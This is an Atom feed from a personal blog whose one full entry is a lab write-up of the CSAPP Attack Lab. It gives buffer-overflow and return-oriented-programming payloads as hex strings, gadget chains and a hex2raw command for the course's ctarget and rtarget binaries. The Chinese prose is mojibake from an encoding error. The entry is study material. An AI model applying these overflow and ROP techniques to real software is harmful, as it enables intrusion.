<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lordaeron_ESZ&#39;s blog</title>
  
  <subtitle>ä»£ç -æ¸¸æˆ-æ•°ç -æŠ€æœ¯</subtitle>
  <link href="http://lordaeronesz.github.io/atom.xml" rel="self"/>
  
  <link href="http://lordaeronesz.github.io/"/>
  <updated>2024-09-25T09:32:48.895Z</updated>
  <id>http://lordaeronesz.github.io/</id>
  
  <author>
    <name>Chaoqun Zheng</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CSAPP Attack Lab</title>
    <link href="http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/09/25/CSAPP-Attack-Lab/</id>
    <published>2024-09-25T03:45:11.000Z</published>
    <updated>2024-09-25T09:32:48.895Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸ªäººæ„Ÿè§‰éå¸¸æœ‰æ„æ€çš„ä¸€ä¸ª Labï¼Œæ¶‰åŠçš„çŸ¥è¯†é¢æ¯”è¾ƒçª„ï¼Œä¸»è¦å…³æ³¨ <strong>ç¼“å†²åŒºæº¢å‡ºæ¼æ´</strong> è¿™ä¸€ä¸ªæ–¹é¢ï¼Œå¹¶åŸºäºæ­¤è¿›è¡Œä»£ç æ”»å‡»ï¼Œä½“éªŒä¸€æŠŠåšé»‘å®¢çš„æ„Ÿè§‰ï¼Œå¯¹åº”çŸ¥è¯†ç‚¹ä¸ºä¹¦ä¸­çš„ 3.10 èŠ‚å†…å®¹ã€‚</p><span id="more"></span><p>è¿™ä¸ª Lab ä¸Šæ‰‹ä¾¿ç»™äº†æˆ‘å½“å¤´ä¸€æ£’ï¼Œåœ¨ç¯å¢ƒé…ç½®ä¸Šç¢ç£¨äº†å¥½ä¸€é˜µã€‚ç›´æ¥è¿è¡Œ <code>./ctarget -q</code> ï¼Œç¨‹åºæ²¡æœ‰è®©è¿›è¡Œè¾“å…¥ï¼Œè€Œæ˜¯ç›´æ¥è§¦å‘äº†æ®µé”™è¯¯ï¼Œåæ¥å°è¯•åœ¨è·‘åœ¨å­¦æ ¡çš„ Linux æœåŠ¡å™¨ä¸Šå¾—ä»¥æ­£å¸¸è¿è¡Œï¼ŒåŸå› ä¸æ˜ï¼Œæ¨æµ‹æ˜¯ WSL çš„é”…ï¼Ÿï¼Ÿ</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/err.png"></p><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>åœ¨å€’è…¾å¥½ç¯å¢ƒä¹‹åï¼Œç»ˆäºå¯ä»¥å¼€å§‹ç€æ‰‹å®Œæˆå®éªŒäº†ã€‚</p><p>phase_1 è¦æ±‚æˆ‘ä»¬åœ¨è°ƒç”¨ <code>getbuf</code> è¯»å–æ ‡å‡†è¾“å…¥åï¼Œä¸è¿”å›åˆ° <code>test</code> å‡½æ•°æ¥ç€æ‰§è¡Œ <code>printf</code>ï¼Œè€Œæ˜¯è½¬è€Œæ‰§è¡Œ <code>touch1</code>.</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    val <span class="token operator">=</span> <span class="token function">getbuf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No exploit. Getbuf returned 0x%x\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å¯ä»¥åˆ©ç”¨ä¹¦ä¸­ 3.10.3 èŠ‚æåˆ°çš„çŸ¥è¯†ï¼Œå‘ç¼“å†²åŒºä¸­å†™å…¥è¿‡é‡çš„æ•°æ®ï¼Œå¤§åˆ°è¶³ä»¥è¦†ç›–æ‰è°ƒç”¨ <code>getbuf</code> æ—¶å‹å…¥æ ˆä¸­çš„è¿”å›åœ°å€ï¼Œå°†å…¶ä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦è·³è½¬æ‰§è¡Œçš„ç¨‹åºçš„èµ·å§‹åœ°å€ï¼Œå³å¯è¾¾æˆç›®çš„ã€‚</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">00000000004017a8 &lt;getbuf&gt;:  4017a8:48 83 ec 28          sub    $0x28,%rsp  4017ac:48 89 e7             mov    %rsp,%rdi  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;  4017b4:b8 01 00 00 00       mov    $0x1,%eax  4017b9:48 83 c4 28          add    $0x28,%rsp  4017bd:c3                   retq     4017be:90                   nop  4017bf:90                   nop</code></pre><p>è§‚å¯Ÿä¸Šè¿°å‡½æ•° <code>getbuf</code> çš„æ±‡ç¼–ä»£ç ï¼Œä»ç¬¬ä¸€æ¡æŒ‡ä»¤ <code>sub  $0x28,%rsp</code>ï¼Œå¯ä»¥çœ‹åˆ°å‡½æ•° <code>getbuf</code> çš„æ ˆå¸§å¤§å°ä¸º 40 å­—èŠ‚ã€‚å› æ­¤è¦å¯¹è¿”å›åœ°å€è¿›è¡Œå†™å…¥ä¿®æ”¹ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆå†™å…¥ 40 å­—èŠ‚çš„ä»»æ„æ•°æ®ï¼Œç„¶åå†å†™å…¥ 8 å­—èŠ‚çš„ç›®æ ‡åœ°å€ã€‚</p><blockquote><p>è¿™é‡Œçš„â€œä»»æ„â€å¹¶éçœŸçš„ä»»æ„ï¼Œå› ä¸ºæœ€ç»ˆçš„è¾“å…¥æ˜¯é€šè¿‡å­—ç¬¦ä¸²çš„å½¢å¼æ¥å®Œæˆçš„ï¼Œå› æ­¤æœ‰äº›ç‰¹å®šçš„å­—ç¬¦å¯èƒ½ä¼šå¯¼è‡´å¼‚å¸¸ï¼Œä¾‹å¦‚ â€˜\nâ€™ï¼ˆå¯¹åº” ASCII ç ä¸º 0x0aï¼‰ï¼Œè¿™é‡Œæˆ‘é€‰ç”¨çš„ 0x3fï¼ˆå‘çµç¥è‡´æ•¬ğŸ˜„ï¼‰ã€‚</p></blockquote><p>æœ€ç»ˆçš„æ”»å‡»æ•°æ®å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fc0 17 40 00 00 00 00 00  &#x2F;&#x2F; ç›®æ ‡åœ°å€</code></pre><p>å¯ä»¥å€ŸåŠ© <code>hex2raw</code> å·¥å…·å°† 16 è¿›åˆ¶è½¬æ¢ä¸ºå¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œå†ç®¡é“ç»™ <code>ctarget</code> å³å¯ã€‚</p><pre class="language-shell" data-language="shell"><code class="language-shell">cat phase_1.txt | .&#x2F;hex2raw | .&#x2F;ctarget -q</code></pre><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><p>phase_2 ç›¸è¾ƒäºç›¸è¾ƒäº phase_1ï¼Œç”±äºè¦éªŒè¯å‚æ•°çš„æ­£ç¡®æ€§ï¼Œå› æ­¤åªæ˜¯è·³è½¬åˆ°ç›®æ ‡ç¨‹åºä½ç½®è¿˜ä¸å¤Ÿï¼Œè¿˜éœ€è¦è®¾ç½®å‚æ•°çš„å€¼ã€‚ä½†åŸå§‹ç¨‹åºä¸­å¹¶æ²¡æœ‰ç›¸å…³çš„ä»£ç ï¼Œé‚£å‚æ•°çš„å€¼åº”è¯¥å¦‚ä½•è®¾ç½®ï¼Ÿ</p><p>è¿™é‡Œå¿…é¡»è¦æœ‰ä¸€ä¸ªç†å¿µï¼šç«™åœ¨å­˜å‚¨çš„è§’åº¦ï¼Œç¨‹åºä¸æ•°æ®å¹¶æ²¡æœ‰åŒºåˆ«ï¼Œå®ƒä»¬éƒ½æ˜¯ç”± 0 å’Œ 1 ç»„æˆçš„æ¯”ç‰¹æµã€‚å› æ­¤ï¼Œè®¾ç½®å‚æ•°çš„ä»£ç æˆ‘ä»¬å¯ä»¥è‡ªè¡Œç¼–å†™ï¼Œå°†å…¶å½“ä½œæ•°æ®è¿›è¡Œä¼ å…¥ï¼Œè¿™æ ·çš„æ“ä½œç§°ä¹‹ä¸º <strong>ä»£ç æ³¨å…¥(code injection)</strong> ã€‚æœ€åå°†æˆ‘ä»¬ç¼–å†™çš„ç¨‹åºçš„åœ°å€ä½œä¸ºè¿”å›åœ°å€ï¼Œè¿™æ ·ï¼Œå½“ç¨‹åºä» <code>getbuf</code> è¿”å›æ—¶ï¼Œå°±ä¼šè·³è½¬åˆ°æˆ‘ä»¬å…ˆå‰æ³¨å…¥çš„ä»£ç ï¼Œä»è€Œè¾¾æˆç›®çš„ã€‚</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¸€ç§æœ‰æ•ˆçš„æ³¨å…¥ä»£ç å®Œæˆçš„æ“ä½œå¦‚ä¸‹ï¼š</p><ol><li>å†™å…¥å¯„å­˜å™¨ <code>%rdi</code> çš„å€¼ï¼Œä½¿å…¶ç­‰äº cookie.</li><li>è·³è½¬åˆ°ç¨‹åº <code>touch2</code> å¤„ã€‚</li></ol><p>å…³äºè·³è½¬ï¼Œå®éªŒæ‰‹å†Œä¸­æ¨èä½¿ç”¨ <code>ret</code> æŒ‡ä»¤ï¼Œå®ƒå¯çœ‹ä½œæ˜¯ä¸¤ä¸ªæ­¥éª¤çš„ç»¼åˆï¼šé¦–å…ˆä»æ ˆä¸­å¼¹å‡ºåœ°å€ Aï¼Œç„¶åå°† PC å€¼è®¾ç½®ä¸º Aã€‚å› æ­¤æƒ³è¦è·³è½¬åˆ° <code>touch2</code>ï¼Œå¯ä»¥å…ˆä½¿ç”¨ <code>push</code> å°† <code>touch2</code> çš„åœ°å€å‹å…¥æ ˆä¸­ï¼Œç„¶åä½¿ç”¨ <code>ret</code> å®ç°è·³è½¬ã€‚</p><p>å¯¹äºæŒ‡ä»¤çš„äºŒè¿›åˆ¶è¡¨ç¤ºï¼Œå¯ä»¥å…ˆç¼–è¯‘ï¼š <code>gcc -c ./injec.s</code>ï¼Œå†åæ±‡ç¼–ï¼š<code>objdump -d ./injec.o</code> å¾—åˆ°ã€‚</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 8b 3c 25 e4 44 60    mov    0x6044e4,%rdi   7:   00    8:   68 ec 17 40 00          pushq  $0x4017ec   d:   c3                      retq</code></pre><p>å¦å¤–ï¼Œè¦æƒ³è·³è½¬åˆ°æ³¨å…¥ä»£ç çš„ä½ç½®ï¼Œæˆ‘ä»¬å¿…é¡»é¦–å…ˆçŸ¥é“å®ƒçš„åœ°å€ï¼Œç”±äº ctarget æ²¡æœ‰ä½¿ç”¨ <strong>æ ˆéšæœºåŒ–ï¼ˆstack randomizationï¼‰</strong> ï¼Œå› æ­¤æˆ‘ä»¬å®Œå…¨å¯ä»¥å…ˆå€ŸåŠ© GDB æ‰“å°å‡ºè°ƒç”¨ <code>Gets</code> å‰çš„æ ˆæŒ‡é’ˆå€¼ï¼Œå†æ ¹æ®æ³¨å…¥ä»£ç ç›¸è¾ƒäºæ ˆæŒ‡é’ˆçš„åç§»è®¡ç®—å¾—åˆ°ã€‚</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-1.png"></p><p>æœ€ç»ˆçš„æ”»å‡»æ•°æ®å¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="language-none"><code class="language-none">48 8b 3c 25 e4 44 60 0068 ec 17 40 00 c3 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00</code></pre><p>æœ€åï¼Œæƒ³åæ§½ä¸€ç‚¹ï¼ŒAttack Lab è²Œä¼¼æ²¡æ³• GDB è°ƒè¯• <code>getbuf</code> ï¼Ÿæ²¡äº†è°ƒè¯•ï¼Œåœ¨ä¸€äº›ç®€å•çš„é”™è¯¯ä¸Šé¢å¡åŠå¤©ã€‚ã€‚ã€‚</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-2.png"></p><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><p>phase_3 å’Œ phase_2 å¾ˆç±»ä¼¼ï¼Œåªä¸è¿‡å‚æ•°ç”±æ•´æ•°æ¢æˆäº†å­—ç¬¦ä¸²ï¼Œä¸è¿‡æ€è·¯éƒ½æ˜¯å¤§æŠµç›¸åŒçš„ã€‚</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">void touch3(char *sval)&#123;    vlevel &#x3D; 3; &#x2F;* Part of validation protocol *&#x2F;    if (hexmatch(cookie, sval)) &#123;    printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);    validate(3);    &#125; else &#123;    printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);    fail(3);    &#125;    exit(0);&#125;&#x2F;* Compare string to hex represention of unsigned value *&#x2F;int hexmatch(unsigned val, char *sval)&#123;    char cbuf[110];    &#x2F;* Make position of check string unpredictable *&#x2F;    char *s &#x3D; cbuf + random() % 100;    sprintf(s, &quot;%.8x&quot;, val);    return strncmp(sval, s, 9) &#x3D;&#x3D; 0;&#125;</code></pre><p>å­—ç¬¦ä¸²ç›¸è¾ƒäºæ•´æ•°ï¼Œæ— å¤–ä¹å¤šäº†ä¸€å±‚ <strong>indirection</strong> ï¼Œä¹Ÿå°±æ˜¯æŒ‡é’ˆã€‚æˆ‘ä»¬åªéœ€è¦é¢„å…ˆåœ¨æŸä¸ªåœ°å€ addr å¤„å°†å­—ç¬¦ä¸²æ•°æ®è¿›è¡Œå­˜å‚¨ï¼Œåç»­å°†å­—ç¬¦ä¸²å‚æ•°è®¾ç½®ä¸º addr å³å¯ï¼ŒåŒæ ·ï¼Œaddr çš„å€¼å¯æ ¹æ®ç›¸å¯¹äºæ ˆçš„åç§»é‡å¾—åˆ°ã€‚</p><p>æ³¨å…¥çš„ä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 c7 c7 88 dc 61 55    mov    $0x5561dc88,%rdi   7:   68 fa 18 40 00          pushq  $0x4018fa   c:   c3                      retq </code></pre><p>è€Œå­—ç¬¦ä¸² <code>&quot;59b997fa&quot;</code> çš„ ASCII ç è¡¨ç¤ºä¸ºï¼š<code>35 39 62 39 39 37 66 61 00</code>ï¼Œæœ€åçš„ <code>00</code> è¡¨ç¤º NULLï¼Œå³ C è¯­è¨€å­—ç¬¦ä¸²çš„ç»ˆç»“ç¬¦ã€‚</p><p>è¿™é‡Œæˆ‘é‡åˆ°äº†ä¸€ç‚¹é—®é¢˜ï¼Œè¿™æ˜¯é”™è¯¯çš„æ”»å‡»æ•°æ®ï¼š</p><pre class="language-none"><code class="language-none">48 c7 c7 88 dc 61 55 68fa 18 40 00 c3 00 00 00 35 39 62 39 39 37 66 6100 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00</code></pre><p>ä¸Šé¢çš„ç­”æ¡ˆçœ‹ä¼¼æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯å®é™…ä¸Šå¿½ç•¥äº†å¾ˆé‡è¦çš„ä¸€ç‚¹ï¼Œå­—ç¬¦ä¸²çš„å€¼å­˜æ”¾åœ¨ <code>getbuf</code> çš„æ ˆå¸§ä¸­ï¼ˆ<code>0x5561dc78 ~ 0x5561dc98</code>ï¼‰ï¼Œåœ¨å®Œæˆå­—ç¬¦ä¸²æ­£ç¡®æ€§æ£€éªŒä¹‹å‰ï¼Œå­—ç¬¦ä¸²çš„å€¼éƒ½åº”è¯¥ <strong>ä¿æŒä¸å˜</strong> ã€‚è€Œå®é™…ä¸Šåœ¨å‡½æ•° <code>getbuf</code> è¿”å›åï¼Œå®ƒçš„æ ˆå¸§ç©ºé—´å°†ä¼šè¢«å›æ”¶ï¼Œç•™ç»™ <code>touch3</code> å’Œ <code>hexmatch</code> åˆ†é…ä½¿ç”¨ï¼Œä¸”è§‚å¯Ÿåæ±‡ç¼–ä»£ç å‘ç°åˆ†é…ç»™ <code>hexmatch</code> çš„æ ˆå¸§ç©ºé—´å¤§äº 40 å­—èŠ‚ï¼Œè¿™å¿…ç„¶å¯¼è‡´ <code>getbuf</code> æ ˆå¸§æ•°æ®è¢«ç ´åï¼Œä¹Ÿå°±å¯¼è‡´äº†é”™è¯¯ã€‚ </p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-1.png"></p><p>ä¸€ç§æ­£ç¡®çš„æ–¹å¼æ˜¯å°†å­—ç¬¦ä¸²æ•°æ®å†™å…¥ <code>test</code> æ ˆå¸§æˆ–æ›´é«˜åœ°å€å¤„ï¼Œå› ä¸ºå®éªŒåªè¦æ±‚æˆåŠŸè§¦å‘ touchï¼Œè€Œå¹¶ä¸è¦æ±‚æ­£ç¡®è¿”å›åˆ°ä¹‹å‰çš„è°ƒç”¨è¿‡ç¨‹ï¼Œå› æ­¤ç ´åä¹‹å‰çš„æ ˆå¸§å¯¹ç»“æœæ— å½±å“ã€‚</p><pre class="language-none"><code class="language-none">48 c7 c7 a8 dc 61 55 68fa 18 40 00 c3 00 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 0035 39 62 39 39 37 66 6100</code></pre><p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-2.png"></p><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><p>åé¢çš„ä¸¤ä¸ªå®éªŒéœ€è¦æ”»å‡»ç¨‹åºæ˜¯ rtargetï¼Œç›¸è¾ƒäº ctargetï¼Œå®ƒå¼•å…¥äº†å¾ˆå¤šå®‰å…¨æªæ–½ï¼Œä¾‹å¦‚æ ˆéšæœºåŒ–ã€é™åˆ¶å¯æ‰§è¡Œä»£ç åŒºåŸŸç­‰ï¼Œå› æ­¤æ”»å‡»èµ·æ¥æ›´ä¸ºå›°éš¾ã€‚</p><p>å‚è€ƒå®éªŒæ‰‹å†Œï¼Œå…¶ä¸­ä»‹ç»äº†ä¸€ç§å¾ˆæœ‰æ„æ€çš„æ”»å‡»æ–¹æ³•ï¼šä¸æ‰‹åŠ¨æ³¨å…¥ä»£ç ï¼Œè€Œæ˜¯å€ŸåŠ©å·²å­˜åœ¨çš„ä»£ç ï¼Œå°†å…¶é‡ç»„ä¸ºæˆ‘ä»¬éœ€è¦çš„æ”»å‡»ä»£ç ã€‚å…¶ä¸­ï¼Œä¸€ä¸ªä»¥ <code>ret</code> æŒ‡ä»¤ç»“æŸçš„æŒ‡ä»¤åºåˆ—ï¼Œç§°ä¹‹ä¸ºä¸€ä¸ª gadgetï¼Œä¸€è¿ä¸²çš„ gadget è¢«è°ƒç”¨å°†ä¼šäº§ç”Ÿç­‰ä»·äºä»£ç æ³¨å…¥çš„æ•ˆæœã€‚</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p4-1.png"></p><p>æƒ³æ³•å¾ˆç¾å¥½ï¼Œä½†æ˜¯å®æ–½èµ·æ¥çš„è¿‡ç¨‹è¿˜æ˜¯æ¯”è¾ƒç—›è‹¦çš„ï¼Œè¦æƒ³ç»„åˆå‡ºæœ‰æ•ˆçš„ gadgetï¼Œéœ€è¦ä»”ç»†å¯¹ç…§æŒ‡ä»¤çš„å­—èŠ‚è¡¨ç¤ºå’Œ <code>farm</code> çš„åæ±‡ç¼–ä»£ç ï¼Œè¿™éƒ¨åˆ†æˆ‘ä¹Ÿæ˜¯å¤§é‡ <del>æŠ„è¢­äº†</del> å‚è€ƒäº†å…¶ä»–äººçš„åšæ³•ã€‚</p><p>ä¸€ç§æ­£ç¡®çš„ gadget ç»„åˆå¦‚ä¸‹ï¼š</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019c5 &lt;setval_426 + 2&gt;:48 89 c7  movq %rax,%rdi90        nopc3  ret</code></pre><p>è¿”å›åœ°å€ä¸º <code>0x4019ab</code>ï¼Œå³ gadget1 çš„èµ·å§‹åœ°å€ï¼Œç„¶åæ ˆä¸­ä»ä½åˆ°é«˜ä¾æ¬¡å­˜æ”¾ï¼šcookie çš„å€¼ã€gadget2 çš„èµ·å§‹åœ°å€ã€<code>touch2</code> çš„èµ·å§‹åœ°å€ã€‚ </p><blockquote><p>è¿™é‡Œè¦æ³¨æ„å‡ºæ ˆæ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘ï¼Œä¸å…¥æ ˆç›¸åã€‚</p></blockquote><p>æœ€ç»ˆçš„æ”»å‡»æ•°æ®å¦‚ä¸‹ï¼š</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00c5 19 40 00 00 00 00 00ec 17 40 00 00 00 00 00</code></pre><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p>æœ€å phase_5 çš„ gadget æ„é€ éå¸¸å¤æ‚ï¼ˆå®˜è§£æ˜¯ç”¨äº† 8 ä¸ªï¼‰ï¼Œåœ¨ CMU çš„å®éªŒä¸­ä¹Ÿæ˜¯å±äºé€‰åšçš„éƒ¨åˆ†ï¼Œå®Œæˆå‰å››ä¸ªå·²ç»æœ‰ 95 åˆ†äº†ï¼Œå› æ­¤è¿™é‡Œä¹Ÿåªä»‹ç»ä¸€äº›é—®é¢˜å’Œæ€è·¯ã€‚</p><p>å‰é¢æåˆ°ï¼Œrtarget å¼•å…¥äº†æ ˆéšæœºåŒ–ï¼Œè¿™ä¼šå¸¦æ¥çš„é—®é¢˜æ˜¯ï¼šåœ¨æŒ‡å®šå‚æ•° sval æ—¶ï¼Œæ— æ³•æ˜¾å¼åœ°æŒ‡å®šåœ°å€ï¼Œè€Œéœ€è¦ä¾é é—´æ¥å¯»å€ï¼Œå³æ ˆæŒ‡é’ˆ <code>%rsp</code> åŠ ä¸Šä¸€ä¸ªç›¸è¾ƒäºå®ƒçš„åç§»é‡ã€‚æˆ‘ä»¬å¯ä»¥å…ˆç¡®å®šå“ªæ¡æŒ‡ä»¤æ ¹æ®æ ˆæŒ‡é’ˆçš„å€¼è®¡ç®—å­—ç¬¦ä¸²å‚æ•°ï¼Œè®°å½•ä¸‹å®ƒçš„ä½ç½®å’Œå­—ç¬¦ä¸²å­˜æ”¾ä½ç½®çš„åç§»é‡ï¼Œä½œä¸ºæ•°æ®ä¸€å¹¶å­˜å…¥æ ˆä¸­ï¼Œåç»­å†å–å‡ºè¿›è¡Œè®¡ç®—ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€ç§æ­£ç¡®çš„ gadget å®ç°ï¼š</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019dd &lt;getval_481 + 2&gt;:89 c2   movl %eax,%edx90nopc3ret# gadget30000000000401a69 &lt;getval_481 + 1&gt;:89 d1   movl %edx,%ecx08 dborb  %bl,%blc3ret# gadget40000000000401a13 &lt;addval_436 + 2&gt;:89 ce   movl %ecx,%esi90nop90nopc3ret# gadget50000000000401aad &lt;setval_350 + 2&gt;:48 89 e0  movq %rsp,%rax90  nopc3  ret# gadget600000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3  ret# gadget700000000004019d6 &lt;add_xy&gt;:48 8d 04 37  lea  (%rdi,%rsi,1),%raxc3 ret# gadget800000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3  ret</code></pre><p>æ”»å‡»æ•°æ®çš„æ„é€ å’Œ phase_4 å¾ˆç±»ä¼¼ï¼Œå°±ä¸è¿‡å¤šèµ˜è¿°äº†ã€‚</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 0020 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0069 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00ad 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 6100</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸ªäººæ„Ÿè§‰éå¸¸æœ‰æ„æ€çš„ä¸€ä¸ª Labï¼Œæ¶‰åŠçš„çŸ¥è¯†é¢æ¯”è¾ƒçª„ï¼Œä¸»è¦å…³æ³¨ &lt;strong&gt;ç¼“å†²åŒºæº¢å‡ºæ¼æ´&lt;/strong&gt; è¿™ä¸€ä¸ªæ–¹é¢ï¼Œå¹¶åŸºäºæ­¤è¿›è¡Œä»£ç æ”»å‡»ï¼Œä½“éªŒä¸€æŠŠåšé»‘å®¢çš„æ„Ÿè§‰ï¼Œå¯¹åº”çŸ¥è¯†ç‚¹ä¸ºä¹¦ä¸­çš„ 3.10 èŠ‚å†…å®¹ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="è®¡ç®—æœºåŸºç¡€" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="ç»éªŒ" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="è®¡ç®—æœºåŸºç¡€" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="æ±‡ç¼–è¯­è¨€" scheme="http://lordaeronesz.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Bomb Lab</title>
    <link href="http://lordaeronesz.github.io/2024/09/17/CSAPP-Bomb-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/09/17/CSAPP-Bomb-Lab/</id>
    <published>2024-09-17T03:45:11.000Z</published>
    <updated>2024-09-19T06:46:56.785Z</updated>
    
